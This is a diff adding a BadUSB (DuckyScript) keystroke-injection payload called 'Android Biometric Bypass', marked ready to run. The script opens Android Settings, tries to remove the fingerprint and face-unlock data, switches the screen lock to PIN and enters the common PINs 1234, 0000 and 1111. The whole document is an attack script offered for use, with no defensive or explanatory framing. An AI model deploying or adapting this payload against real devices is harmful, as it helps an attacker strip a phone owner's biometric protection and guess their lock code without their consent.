@@ -1,0 +1,63 @@
+REM Title: Android Biometric Bypass
+REM Author: BadUSB Library
+REM Description: Attempts to bypass biometric authentication
+REM Target: Android 7.0+
+REM Category: Authentication
+REM Type: Directly Ready
+
+REM Open Settings
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Settings
+ENTER
+DELAY 3000
+
+REM Navigate to Security
+STRING Security
+ENTER
+DELAY 2000
+
+STRING Biometrics
+ENTER
+DELAY 2000
+
+REM Try to disable biometrics
+STRING Fingerprint
+ENTER
+DELAY 2000
+
+STRING Remove fingerprint
+ENTER
+DELAY 2000
+
+REM Try Face unlock
+STRING Face unlock
+ENTER
+DELAY 2000
+
+STRING Remove face data
+ENTER
+DELAY 2000
+
+REM Try to change to PIN
+STRING Screen lock
+ENTER
+DELAY 2000
+
+STRING PIN
+ENTER
+DELAY 2000
+
+REM Try common PINs
+STRING 1234
+ENTER
+DELAY 1000
+
+STRING 0000
+ENTER
+DELAY 1000
+
+STRING 1111
+ENTER
+DELAY 1000
